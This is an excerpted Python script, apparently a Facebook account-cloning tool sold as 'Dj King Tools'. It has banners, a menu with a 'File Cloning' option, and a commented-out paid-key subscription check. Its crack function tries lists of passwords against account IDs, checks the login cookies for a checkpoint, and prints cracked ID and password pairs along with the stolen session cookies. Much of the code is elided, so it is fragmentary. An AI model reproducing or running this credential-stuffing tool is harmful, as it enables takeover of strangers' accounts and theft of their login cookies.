...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mDj')
...
#while attemps < 12345677901:
 ...
 #   if username == 'Dj' and password == 'King':
...
os.system('espeak -a 300 " Welcome,   to,  Dj,  King,  Tools"')
...
$$$$$$$/         __   $$ |
                ...
                $$    $$/ 
                 $$$$$$/  
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING MOBILE DATA AND WIFI ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;32m════════════════════════════════════════════
\033[1;32m[+]     Owner    :DJ-KING➼
\033[1;32m[+]     Facebook : SABBIR ISLAM ➼
\033[1;32m[+]     Version  : 0.0 ➼
\033[1;32m[+]     GITHUB   : SABBI4 ➼
\033[1;32m[+]     TOOLS  : \x1b[91;1m FREE ➼
\033[1;32m[+]     WHATSAPP : *********** ➼
\033[1;32m════════════════════════════════════════════""")
def login():
	banner()
	Djj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	Djj('\033[0;97m════════════════════════════════════════════')
	Dj= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if Dj in ['m']:
		public()
	elif Dj in ['1']:
		crack_file()
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN DjY\n\x1b[1;97m [1] METHOD Dj ')
	os.system('espeak -a 300 " 1,  method,  Dj"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Dj-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Dj-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•Dj-Cp] {idf} • {pw}')     
				...
				#Dj-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Dj-Ok💙] {idf} • {pw}\n\033[0;93m[🍪]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Dj,  Ok,  id"')
...
def Subscraption():
	...
	# r1=requests.get("https://github.com/Dj-King/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		# os.system('clear')
		login()
	else:
		...
		# time.sleep(0.0010)
		# print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Dj King, ToOLs Daily Update")
		# print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		# print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		# print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Dj+key1)
		...
		# time.sleep(3.5)
		# tks = 'Assalamu%20Alaikum-!💙,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Dj+''+key1
